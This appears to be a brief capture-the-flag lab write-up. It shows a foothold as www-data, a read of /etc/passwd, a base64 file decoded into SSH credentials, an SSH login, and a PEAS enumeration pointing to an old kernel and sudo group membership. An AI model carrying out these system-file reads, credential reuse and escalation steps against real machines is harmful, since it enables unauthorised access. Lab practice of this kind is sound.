# 3 box enum

```
<w/html/administration/upload/files$ cat /etc/passwd | grep /home/
root:x:0:0:root:/root:/bin/bash
[truncated]
yousef:x:1000:1000:yousef,,,:/home/yousef:/bin/bash

www-data@yousef-VirtualBox:/home$ cat user.txt
c3NoIDogCnVzZXIgOiB5b3VzZWYgCnBhc3MgOiB5b3VzZWYxMjM=

$ echo "c3NoIDogCnVzZXIgOiB5b3VzZWYgCnBhc3MgOiB5b3VzZWYxMjM=" | base64 -d
ssh :
user : yousef
pass : yousef123

$ ssh yousef@192.168.131.138

yousef@yousef-VirtualBox:~$ whoami;id;hostname
yousef
uid=1000(yousef) gid=1000(yousef) groups=1000(yousef),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lpadmin),124(sambashare)
yousef-VirtualBox
```

## PEAS

```
Linux version 3.13.0-24-generic (buildd@roseapple) (gcc version 4.8.2 (Ubuntu 4.8.2-19ubuntu1) ) #46-Ubuntu SMP Thu Apr 10 19:08:14 UTC 2014
Distributor ID: Ubuntu
Description:    Ubuntu 14.04 LTS
Release:        14.04
Codename:       trusty

User & Groups: uid=1000(yousef) gid=1000(yousef) groups=1000(yousef),27(sudo)
```
